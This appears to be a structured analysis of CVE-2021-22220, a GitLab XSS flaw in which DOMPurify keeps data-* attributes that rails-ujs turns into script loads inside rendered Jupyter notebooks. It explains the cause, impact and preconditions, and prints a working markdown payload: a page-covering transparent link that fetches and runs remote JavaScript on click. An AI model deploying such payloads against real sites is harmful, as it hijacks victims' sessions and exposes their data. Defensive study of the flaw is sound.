Based on the provided content, here's an analysis of CVE-2021-22220:

**Root Cause of Vulnerability:**

The vulnerability stems from the improper sanitization of user-provided HTML content within the blob viewer of GitLab notebooks. Specifically, the use of `Dompurify` to sanitize data, which allows `data-*` attributes by default, coupled with the presence of `rails-ujs`, creates an exploitable scenario.

**Weaknesses/Vulnerabilities Present:**

*   **Insufficient Input Sanitization:** The primary weakness is the failure to remove `data-*` attributes during HTML sanitization.
*   **Reliance on `rails-ujs`:** The presence of `rails-ujs` allows the exploitation of  `data-*` attributes to trigger JavaScript execution.
*   **XSS Vulnerability:** This combination leads to a Cross-Site Scripting (XSS) vulnerability.

**Impact of Exploitation:**

*   **Arbitrary JavaScript Execution:** Attackers can execute arbitrary JavaScript code in the victim's browser when they view the crafted notebook.
*   **Session Hijacking:** With JavaScript execution, attackers can potentially perform actions on behalf of the victim, such as escalating privileges, accessing private objects, and other unauthorized activities, as GitLab allows sending API requests via JavaScript in Web browsers
*   **Data exfiltration:** The attacker can exfiltrate sensitive data.

**Attack Vectors:**

*   **Malicious Notebook Creation:** The attack vector involves crafting a malicious Jupyter notebook (`.ipynb`) file containing HTML with `data-*` attributes linked to a remote script.
*   **User Interaction:** Exploitation requires the victim to view the malicious notebook within the GitLab blob viewer and to click anywhere on the page. The attacker adds a transparent layer on top of the view, so that the click will trigger the script

**Required Attacker Capabilities/Position:**

*   **GitLab Project Access:** An attacker needs the ability to create or modify a Jupyter notebook within a GitLab project.
*   **Remote Script Hosting:** The attacker needs to host a malicious JavaScript file accessible via URL.

**Technical Details:**

The attacker crafts a notebook with the following markdown content:
```html
 <a data-type=script data-remote=true href='https://gitlab.com/ankelly/pipeline_payload/-/jobs/[REDACTED]/artifacts/raw/data/alert.js' style='position:fixed;z-index:9999;top:0;left:0;right:0;bottom:0'></a>CLICK ANYWHERE TO SHOW POPUP
```

When a user views the notebook, the rendered HTML includes an `<a>` element with `data-type="script"` and `data-remote="true"`. When the user clicks anywhere on the view, `rails-ujs` interprets these data attributes and triggers a GET request to the specified URL, executing the returned Javascript.

The provided content gives more technical information compared to a standard CVE description.